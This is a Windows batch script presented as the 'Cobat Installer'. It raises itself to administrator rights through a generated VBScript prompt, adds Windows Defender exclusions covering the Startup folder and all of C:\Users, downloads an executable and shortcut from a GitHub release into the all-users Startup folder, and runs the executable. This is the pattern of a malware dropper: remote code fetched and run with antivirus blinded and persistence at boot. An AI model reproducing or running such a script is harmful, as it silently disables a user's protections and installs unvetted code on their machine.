@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
Title Cobat Installer & Color 5
Powershell Add-MpPreference -ExclusionPath "'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat Short.lnk'"
Powershell Add-MpPreference -ExclusionPath "'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat.exe'"
Powershell Add-MpPreference -ExclusionPath "'C:\Users'"
powershell -c "Invoke-WebRequest -Uri 'https://github.com/NOTNA9015/Cobat/releases/download/Pull/Cobat.exe' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat.exe'"
powershell -c "Invoke-WebRequest -Uri 'https://github.com/NOTNA9015/Cobat/releases/download/Pull/Cobat.Shortcut.lnk' -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Cobat Short.lnk'"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Cobat.exe
taskkill /F /IM cobat.install.exe